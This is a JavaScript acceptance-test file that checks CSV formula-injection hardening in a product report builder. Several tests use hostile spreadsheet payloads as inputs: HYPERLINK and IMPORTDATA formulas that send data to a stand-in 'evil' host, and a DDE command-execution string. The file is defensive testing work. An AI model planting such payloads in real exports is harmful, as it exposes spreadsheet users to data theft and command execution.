/**
 * ATDD tests for Story 3.5a: CSV Formula Injection Hardening (CWE-1236)
 *
 * Acceptance criteria verified:
 * AC-1: Column classification explicit in buildReport.js — text vs numeric columns
 * AC-2: escapeTextCell(val) prefixes single-quote when first char is a formula trigger
 *        (= + - @ \t \r); null/empty/undefined returns '' unchanged
 * AC-3: Text columns (EAN, product_title, shop_sku) use escapeTextCell; numeric columns use escapeCell
 * AC-4: Deferred-trade-off comment removed — replaced with text-vs-numeric classification comment
 * AC-5: Existing ATDD exact-byte fixtures remain green with zero changes (verified by CI)
 * AC-6: New behavioural tests cover every trigger character + negative cases + realistic HYPERLINK payload
 * AC-7: npm test green across all tests
 * AC-8: No new imports, no DB schema changes, no new dependencies
 *
 * ALL tests here are BEHAVIOURAL: call buildAndPersistReport with a constructed
 * catalog entry, retrieve the persisted csv_data via getReport, split by \n, and
 * assert on the data row. No source-text scans for behavioural invariants.
 *
 * Uses Node.js built-in test runner (node:test) — no extra dependencies needed.
 * Run: node --test tests/epic3-3.5a-csv-formula-injection.additional.test.js
 *
 * Uses real SQLite in-memory database (SQLITE_PATH=:memory:) — no network needed.
 */

import { test, describe, before } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const __dirname = dirname(fileURLToPath(import.meta.url))

// ── env setup ──────────────────────────────────────────────────────────────
process.env.NODE_ENV    = 'test'
process.env.SQLITE_PATH = ':memory:'
process.env.REDIS_URL   = process.env.REDIS_URL || 'redis://localhost:6379'
process.env.APP_BASE_URL    = process.env.APP_BASE_URL    || 'http://localhost:3000'
process.env.WORTEN_BASE_URL = process.env.WORTEN_BASE_URL || 'https://www.worten.pt'
process.env.PORT        = process.env.PORT || '3000'
process.env.LOG_LEVEL   = 'silent'

// ── helpers ────────────────────────────────────────────────────────────────

function randomId() {
  return `test-3.5a-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
}

/**
 * Minimal computedReport shape — enough to exercise buildAndPersistReport without
 * triggering errors. All products are treated as "winning" in PT (absent from
 * opportunities_pt) unless overridden, so numeric gap/score columns are empty strings
 * and won't interfere with assertions about text columns.
 */
function minimalComputedReport() {
  return {
    opportunities_pt: [],
    opportunities_es: [],
    quickwins_pt: [],
    quickwins_es: [],
    summary_pt: { total: 1, winning: 1, losing: 0, uncontested: 0 },
    summary_es: { total: 1, winning: 0, losing: 0, uncontested: 1 },
  }
}

/**
 * Build + persist a single-product report, retrieve it, and return the data row
 * (the second line of csv_data — the first is the header).
 */
function buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle, ean = 'EAN-001', shopSku = 'SKU-001', price = '9.99', computedReport = null } = {}) {
  const reportId = randomId()
  const catalog = [{ ean, shop_sku: shopSku, product_title: productTitle, price }]
  buildAndPersistReport(reportId, 'atdd@example.com', catalog, computedReport ?? minimalComputedReport())
  const now = Math.floor(Date.now() / 1000)
  const row = getReport(reportId, now)
  assert.ok(row, `getReport must return the persisted report for reportId=${reportId}`)
  const csv = row.csv_data ?? row.csvData
  assert.ok(typeof csv === 'string' && csv.length > 0, 'csv_data must be a non-empty string')
  const lines = csv.split('\n')
  // lines[0] = header; lines[1] = first data row
  return { csv, lines, dataRow: lines[1] }
}

/**
 * Given the CSV data row (a comma-separated string) return cell at the given
 * column index, handling RFC 4180 double-quoted cells.
 *
 * This is a simple parser adequate for the test assertions here — it handles the
 * case where a cell is wrapped in "..." (with internal "" escaped as "").
 * Column indices follow the 12-column spec:
 *   0=EAN, 1=product_title, 2=shop_sku, 3=my_price,
 *   4=pt_first_price, 5=pt_gap_eur, 6=pt_gap_pct, 7=pt_wow_score,
 *   8=es_first_price, 9=es_gap_eur, 10=es_gap_pct, 11=es_wow_score
 */
function parseRfc4180Row(row) {
  const cells = []
  let i = 0
  while (i < row.length) {
    if (row[i] === '"') {
      // quoted cell
      let cell = ''
      i++ // skip opening quote
      while (i < row.length) {
        if (row[i] === '"' && row[i + 1] === '"') {
          cell += '"'
          i += 2
        } else if (row[i] === '"') {
          i++ // skip closing quote
          break
        } else {
          cell += row[i]
          i++
        }
      }
      cells.push(cell)
      if (row[i] === ',') i++ // skip delimiter
    } else {
      // unquoted cell
      const end = row.indexOf(',', i)
      if (end === -1) {
        cells.push(row.slice(i))
        break
      } else {
        cells.push(row.slice(i, end))
        i = end + 1
        // If we just consumed the last comma and there is nothing left, the
        // final cell is an empty string — push it so the cell count matches
        // the column count (important for 12-column rows ending with empty fields).
        if (i === row.length) {
          cells.push('')
          break
        }
      }
    }
  }
  return cells
}

const BUILD_REPORT_PATH = join(__dirname, '../src/workers/scoring/buildReport.js')

// ── AC-6 (T5a.1–T5a.6): Trigger character coverage ────────────────────────

describe('AC-6 (T5a.1–T5a.6): Formula trigger characters are neutralised in product_title', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  const triggerCases = [
    { trigger: '=', title: '=MALICIOUS()', label: 'equals sign (=)' },
    { trigger: '+', title: '+formula',    label: 'plus sign (+)' },
    { trigger: '-', title: '-0',          label: 'minus sign (-)' },
    { trigger: '@', title: '@user',       label: 'at sign (@)' },
    { trigger: '\t', title: '\tindented', label: 'tab character (\\t)' },
    { trigger: '\r', title: '\rreturn',   label: 'carriage return (\\r)' },
  ]

  for (const { trigger, title, label } of triggerCases) {
    test(`T5a: product_title starting with ${label} is prefixed with single-quote in CSV`, async () => {
      const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: title })

      // Parse the RFC 4180 row to extract the product_title cell (column 1)
      const cells = parseRfc4180Row(dataRow)
      const titleCell = cells[1]

      assert.ok(
        titleCell !== undefined,
        `product_title cell must be present in CSV data row. Got row: ${JSON.stringify(dataRow)}`
      )
      assert.ok(
        titleCell.startsWith("'"),
        `product_title starting with '${label}' must be prefixed with single-quote. ` +
        `Got cell value: ${JSON.stringify(titleCell)} in row: ${JSON.stringify(dataRow)}`
      )
      assert.ok(
        titleCell.includes(trigger),
        `The original trigger character must still be present after the single-quote prefix. ` +
        `Got: ${JSON.stringify(titleCell)}`
      )
    })
  }
})

// ── AC-6 (T5a.7): Safe first-character title is NOT prefixed ──────────────

describe('AC-6 (T5a.7): Safe first-character product_title is NOT prefixed', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('T5a.7: product_title = "Samsung Galaxy S24" is NOT prefixed with single-quote', async () => {
    const title = 'Samsung Galaxy S24'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: title })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.ok(
      !titleCell.startsWith("'"),
      `Safe product_title must NOT be prefixed with single-quote. ` +
      `Got: ${JSON.stringify(titleCell)}`
    )
    // The title text itself must still be present (unmodified)
    assert.ok(
      titleCell.includes('Samsung Galaxy S24'),
      `Original product_title text must be preserved. Got: ${JSON.stringify(titleCell)}`
    )
  })
})

// ── AC-6 (T5a.8): Mid-string trigger is NOT prefixed (only first char matters) ─

describe('AC-6 (T5a.8): Mid-string trigger in product_title does NOT trigger prefix', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('T5a.8: product_title = "Product = great deal" is NOT prefixed (= is mid-string)', async () => {
    const title = 'Product = great deal'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: title })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.ok(
      !titleCell.startsWith("'"),
      `product_title with mid-string trigger must NOT be prefixed. ` +
      `Got: ${JSON.stringify(titleCell)}`
    )
    // The title text itself must be preserved
    assert.ok(
      titleCell.includes('Product'),
      `Original product_title text must still be present. Got: ${JSON.stringify(titleCell)}`
    )
  })

  test('T5a.8b: product_title = "Laptop =HYPERLINK(url)" starting with L is NOT prefixed', async () => {
    const title = 'Laptop =HYPERLINK("http://evil","click")'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: title })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.ok(
      !titleCell.startsWith("'"),
      `product_title containing =HYPERLINK at mid-string must NOT be prefixed when first char is safe. ` +
      `Got: ${JSON.stringify(titleCell)}`
    )
  })
})

// ── AC-6 (T5a.9): Empty product_title produces empty cell ─────────────────

describe('AC-6 (T5a.9): Empty product_title produces empty CSV cell with no prefix', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('T5a.9: product_title = "" produces an empty cell — no single-quote prefix', async () => {
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: '' })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.equal(
      titleCell,
      '',
      `Empty product_title must produce an empty CSV cell (no prefix). Got: ${JSON.stringify(titleCell)}`
    )
  })

  test('T5a.9b: product_title = null produces an empty cell — no single-quote prefix', async () => {
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: null })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.equal(
      titleCell,
      '',
      `null product_title must produce an empty CSV cell (no prefix). Got: ${JSON.stringify(titleCell)}`
    )
  })

  test('T5a.9c: product_title = undefined produces an empty cell — no single-quote prefix', async () => {
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: undefined })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.equal(
      titleCell,
      '',
      `undefined product_title must produce an empty CSV cell (no prefix). Got: ${JSON.stringify(titleCell)}`
    )
  })
})

// ── AC-6 (T5a.10): Realistic HYPERLINK payload (end-to-end) ───────────────

describe('AC-6 (T5a.10): Realistic HYPERLINK payload is fully neutralised end-to-end', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('T5a.10: =HYPERLINK payload is prefixed with single-quote and RFC 4180 quoted', async () => {
    // This is the most dangerous payload: starts with = (formula trigger),
    // contains a comma (requires RFC 4180 quoting), and contains double-quotes.
    const title = '=HYPERLINK("http://evil/steal","click")'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: title })

    // The raw CSV bytes for this cell must start with: "'=HYPERLINK(
    // (outer double-quote from RFC 4180 wrapping, then single-quote prefix, then =)
    assert.ok(
      dataRow.includes('"\'=HYPERLINK('),
      `The HYPERLINK payload cell must start with the RFC 4180 outer double-quote, ` +
      `then single-quote, then =. Expected to find "'\''=HYPERLINK( in CSV row. ` +
      `Got row: ${JSON.stringify(dataRow)}`
    )

    // Parse via RFC 4180 and verify the decoded cell value starts with '
    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]
    assert.ok(
      titleCell.startsWith("'"),
      `Decoded product_title cell must start with single-quote. Got: ${JSON.stringify(titleCell)}`
    )
    assert.ok(
      titleCell.startsWith("'=HYPERLINK"),
      `Decoded product_title must be single-quote followed by the original payload. ` +
      `Got: ${JSON.stringify(titleCell)}`
    )
  })

  test('T5a.10b: =IMPORTDATA payload (Google Sheets auto-fire) is neutralised', async () => {
    const title = '=IMPORTDATA("http://evil/steal?c="&A1)'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: title })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.ok(
      titleCell.startsWith("'"),
      `=IMPORTDATA payload must be prefixed with single-quote. Got: ${JSON.stringify(titleCell)}`
    )
    assert.ok(
      titleCell.startsWith("'=IMPORTDATA"),
      `Decoded cell must start with '=IMPORTDATA. Got: ${JSON.stringify(titleCell)}`
    )
  })

  test('T5a.10c: DDE payload (=cmd|...) starting with = is neutralised', async () => {
    const title = "=cmd|' /C calc'!A0"
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, { productTitle: title })

    const cells = parseRfc4180Row(dataRow)
    const titleCell = cells[1]

    assert.ok(
      titleCell.startsWith("'"),
      `DDE payload must be prefixed with single-quote. Got: ${JSON.stringify(titleCell)}`
    )
  })
})

// ── AC-6 (T5a.11): CSV header row is literal — no prefix applied ───────────

describe('AC-6 (T5a.11): CSV header row is the exact 12-column literal string', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('T5a.11: First line of csv_data is exactly the 12-column header — no leading single-quote on any column name', async () => {
    const reportId = randomId()
    const catalog = [{ ean: 'EAN-HDR', shop_sku: 'SKU-HDR', product_title: 'Header Test', price: '10.00' }]
    buildAndPersistReport(reportId, 'atdd@example.com', catalog, minimalComputedReport())

    const now = Math.floor(Date.now() / 1000)
    const row = getReport(reportId, now)
    const csv = row.csv_data ?? row.csvData
    const headerRow = csv.split('\n')[0]

    const expectedHeader = 'EAN,product_title,shop_sku,my_price,pt_first_price,pt_gap_eur,pt_gap_pct,pt_wow_score,es_first_price,es_gap_eur,es_gap_pct,es_wow_score'

    assert.equal(
      headerRow,
      expectedHeader,
      `Header row must be the exact 12-column literal string without any prefix. ` +
      `Got: ${JSON.stringify(headerRow)}`
    )
  })
})

// ── AC-6 (T5a.12): Numeric column with leading minus is NOT prefixed ────────

describe('AC-6 (T5a.12): Numeric columns with leading minus are NOT prefixed (machine-parseable)', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('T5a.12: pt_gap_eur with a negative value (e.g. -0.50) is NOT prefixed — stays machine-parseable', async () => {
    const reportId = randomId()
    const catalog = [{ ean: 'EAN-NEG', shop_sku: 'SKU-NEG', product_title: 'Negative Gap', price: '10.00' }]

    // Make EAN-NEG a "losing" product so pt_gap_eur is populated with a negative value
    const computedReport = {
      opportunities_pt: [
        {
          ean: 'EAN-NEG',
          shop_sku: 'SKU-NEG',
          product_title: 'Negative Gap',
          my_price: 10.00,
          competitor_first: 10.50,  // competitor is MORE expensive — gap is negative
          gap: -0.50,
          gap_pct: -0.0476,
          wow_score: 210.04,
          is_quick_win: false,
        },
      ],
      opportunities_es: [],
      quickwins_pt: [],
      quickwins_es: [],
      summary_pt: { total: 1, winning: 0, losing: 1, uncontested: 0 },
      summary_es: { total: 1, winning: 0, losing: 0, uncontested: 1 },
    }

    buildAndPersistReport(reportId, 'atdd@example.com', catalog, computedReport)

    const now = Math.floor(Date.now() / 1000)
    const row = getReport(reportId, now)
    const csv = row.csv_data ?? row.csvData
    const dataRow = csv.split('\n')[1]

    const cells = parseRfc4180Row(dataRow)
    // Column 5 = pt_gap_eur
    const ptGapEurCell = cells[5]

    assert.ok(
      ptGapEurCell !== undefined,
      `pt_gap_eur cell must be present. Data row: ${JSON.stringify(dataRow)}`
    )
    assert.ok(
      !ptGapEurCell.startsWith("'"),
      `Numeric pt_gap_eur cell must NOT be prefixed with single-quote. ` +
      `Got: ${JSON.stringify(ptGapEurCell)} in data row: ${JSON.stringify(dataRow)}`
    )
    // The value must start with '-' (a minus, not a quote) — machine-parseable
    assert.ok(
      ptGapEurCell.startsWith('-') || ptGapEurCell === '"-0.5"' || ptGapEurCell.includes('-0.5'),
      `pt_gap_eur with -0.5 must appear as a machine-parseable negative number, not prefixed. ` +
      `Got: ${JSON.stringify(ptGapEurCell)}`
    )
  })

  test('T5a.12b: my_price numeric column is never prefixed (even if value starts with 0)', async () => {
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, {
      productTitle: 'Cheap Product',
      price: '0.99',
    })

    const cells = parseRfc4180Row(dataRow)
    // Column 3 = my_price
    const myPriceCell = cells[3]

    assert.ok(
      !myPriceCell.startsWith("'"),
      `my_price numeric cell must NOT be prefixed with single-quote. ` +
      `Got: ${JSON.stringify(myPriceCell)}`
    )
    assert.equal(myPriceCell, '0.99', `my_price must be 0.99 unmodified. Got: ${JSON.stringify(myPriceCell)}`)
  })
})

// ── AC-3 + AC-6: Text columns (EAN, shop_sku) are also neutralised ──────────

describe('AC-3: EAN and shop_sku (text columns) trigger characters are also neutralised', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('EAN starting with = is prefixed with single-quote in the CSV', async () => {
    const ean = '=BAD_EAN'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, {
      ean,
      productTitle: 'Safe Title',
    })

    const cells = parseRfc4180Row(dataRow)
    // Column 0 = EAN
    const eanCell = cells[0]

    assert.ok(
      eanCell.startsWith("'"),
      `EAN starting with = must be prefixed with single-quote. Got: ${JSON.stringify(eanCell)}`
    )
  })

  test('shop_sku starting with + is prefixed with single-quote in the CSV', async () => {
    const shopSku = '+BAD_SKU'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, {
      shopSku,
      productTitle: 'Safe Title',
    })

    const cells = parseRfc4180Row(dataRow)
    // Column 2 = shop_sku
    const skuCell = cells[2]

    assert.ok(
      skuCell.startsWith("'"),
      `shop_sku starting with + must be prefixed with single-quote. Got: ${JSON.stringify(skuCell)}`
    )
  })

  test('Safe EAN (numeric) is NOT prefixed with single-quote', async () => {
    const ean = '1234567890123'
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, {
      ean,
      productTitle: 'Safe Title',
    })

    const cells = parseRfc4180Row(dataRow)
    const eanCell = cells[0]

    assert.ok(
      !eanCell.startsWith("'"),
      `Safe numeric EAN must NOT be prefixed. Got: ${JSON.stringify(eanCell)}`
    )
    assert.equal(eanCell, ean, `EAN value must be preserved. Got: ${JSON.stringify(eanCell)}`)
  })
})

// ── AC-1 + AC-4 (static): Source classification and comment update ──────────

describe('AC-1 + AC-4 (static): buildReport.js source structure invariants', () => {
  let src

  before(() => {
    src = readFileSync(BUILD_REPORT_PATH, 'utf8')
  })

  test('AC-1: escapeTextCell is used for EAN column in buildReport.js', () => {
    // The source must call escapeTextCell for entry.ean — confirms text column classification
    assert.ok(
      src.includes('escapeTextCell') && src.includes('entry.ean'),
      'buildReport.js must call escapeTextCell and reference entry.ean — text column classification must be explicit'
    )
    // Specifically: the row builder must call escapeTextCell for ean (not just escapeCell)
    assert.ok(
      /escapeTextCell\s*\(\s*entry\.ean\s*\)/.test(src),
      'buildReport.js must call escapeTextCell(entry.ean) in the row builder — EAN is an attacker-controllable text column'
    )
  })

  test('AC-1: escapeTextCell is used for product_title column in buildReport.js', () => {
    assert.ok(
      /escapeTextCell\s*\(\s*entry\.product_title\s*\)/.test(src),
      'buildReport.js must call escapeTextCell(entry.product_title) — product_title is attacker-controllable'
    )
  })

  test('AC-1: escapeTextCell is used for shop_sku column in buildReport.js', () => {
    assert.ok(
      /escapeTextCell\s*\(\s*entry\.shop_sku\s*\)/.test(src),
      'buildReport.js must call escapeTextCell(entry.shop_sku) — shop_sku is attacker-controllable'
    )
  })

  test('AC-1: escapeCell (not escapeTextCell) is used for numeric columns — no cross-contamination', () => {
    // The raw escapeCell call must still be present for numeric columns
    // (e.g. escapeCell(entry.price), escapeCell(pt ? pt.competitor_first : ''), etc.)
    // We check that escapeCell is still referenced in the row-building section.
    assert.ok(
      src.includes('escapeCell('),
      'buildReport.js must still use escapeCell() for numeric columns — do not replace all calls with escapeTextCell'
    )
  })

  test('AC-1: escapeCell is NOT called directly for the three text columns (no regression)', () => {
    // After hardening, escapeCell(entry.ean), escapeCell(entry.product_title),
    // escapeCell(entry.shop_sku) must NOT appear — they were replaced by escapeTextCell.
    assert.ok(
      !/escapeCell\s*\(\s*entry\.ean\s*\)/.test(src),
      'buildReport.js must NOT call escapeCell(entry.ean) — EAN must use escapeTextCell'
    )
    assert.ok(
      !/escapeCell\s*\(\s*entry\.product_title\s*\)/.test(src),
      'buildReport.js must NOT call escapeCell(entry.product_title) — product_title must use escapeTextCell'
    )
    assert.ok(
      !/escapeCell\s*\(\s*entry\.shop_sku\s*\)/.test(src),
      'buildReport.js must NOT call escapeCell(entry.shop_sku) — shop_sku must use escapeTextCell'
    )
  })

  test('AC-4: The deferred-trade-off comment has been removed from buildReport.js', () => {
    // The original comment at lines 22-29 contained the phrase "deferred" in the
    // context of formula injection. After hardening, this must be replaced.
    // We look for the conjunction of "deferred" near formula-injection language.
    const lowerSrc = src.toLowerCase()
    // Simple check: the word "deferred" must not appear adjacent to "formula" or "injection"
    // within the same comment block.
    const deferredIdx = lowerSrc.indexOf('deferred')
    if (deferredIdx !== -1) {
      // Get the surrounding 300 chars to check context
      const context = lowerSrc.slice(Math.max(0, deferredIdx - 150), deferredIdx + 150)
      assert.ok(
        !context.includes('formula') && !context.includes('injection') && !context.includes('cwe'),
        `The "deferred" language must NOT appear near formula injection / CWE language. ` +
        `Found context: ${JSON.stringify(context)}`
      )
    }
    // AC-4 is satisfied even if "deferred" appears elsewhere unrelated to this fix.
  })

  test('AC-8: buildReport.js has no new imports beyond the original insertReport import', () => {
    // The only import in buildReport.js must still be the insertReport from queries.js.
    // No new external libraries or helpers should have been added.
    const importLines = src.split('\n').filter(line => line.trim().startsWith('import '))
    assert.equal(
      importLines.length,
      1,
      `buildReport.js must have exactly 1 import statement (insertReport from queries.js). ` +
      `Found ${importLines.length} import(s): ${JSON.stringify(importLines)}`
    )
    assert.ok(
      importLines[0].includes('insertReport') && importLines[0].includes('queries.js'),
      `The only import must be insertReport from queries.js. Got: ${JSON.stringify(importLines[0])}`
    )
  })
})

// ── AC-5 + AC-7 (regression guard): Existing fixture cells are unchanged ────

describe('AC-5 + AC-7 (regression guard): Existing safe fixture values are not altered by hardening', () => {
  let buildAndPersistReport
  let getReport

  before(async () => {
    const queries = await import('../src/db/queries.js')
    getReport = queries.getReport
    const buildMod = await import('../src/workers/scoring/buildReport.js')
    buildAndPersistReport = buildMod.buildAndPersistReport
  })

  test('Fixture from epic3-3.5 style: EAN=1234, product_title=Test — no prefix added (safe chars)', async () => {
    // Mirrors the csv_data fixture in epic3-3.5-report-persistence.atdd.test.js:
    //   csv_data: 'EAN,product_title\n1234,Test'
    // Neither 1234 nor Test starts with a trigger char — must NOT get a single-quote prefix.
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, {
      ean: '1234',
      productTitle: 'Test',
      shopSku: 'SKU-SAFE',
      price: '9.99',
    })

    const cells = parseRfc4180Row(dataRow)
    assert.equal(cells[0], '1234', `EAN "1234" must not be prefixed. Got: ${JSON.stringify(cells[0])}`)
    assert.equal(cells[1], 'Test', `product_title "Test" must not be prefixed. Got: ${JSON.stringify(cells[1])}`)
  })

  test('Fixture from epic4-4.3 style: EAN=1234567890123, product_title="Test Product", SKU=SKU-001 — no prefix added', async () => {
    // Mirrors the SAMPLE_CSV fixture from epic4-4.3-get-api-reports-and-csv.atdd.test.js.
    // None of these text cells start with a trigger char — must NOT get a single-quote prefix.
    const { dataRow } = buildAndGetDataRow(buildAndPersistReport, getReport, {
      ean: '1234567890123',
      productTitle: 'Test Product',
      shopSku: 'SKU-001',
      price: '29.99',
    })

    const cells = parseRfc4180Row(dataRow)
    assert.equal(cells[0], '1234567890123', `EAN "1234567890123" must not be prefixed. Got: ${JSON.stringify(cells[0])}`)
    assert.equal(cells[1], 'Test Product', `product_title "Test Product" must not be prefixed. Got: ${JSON.stringify(cells[1])}`)
    assert.equal(cells[2], 'SKU-001', `shop_sku "SKU-001" must not be prefixed. Got: ${JSON.stringify(cells[2])}`)
  })
})
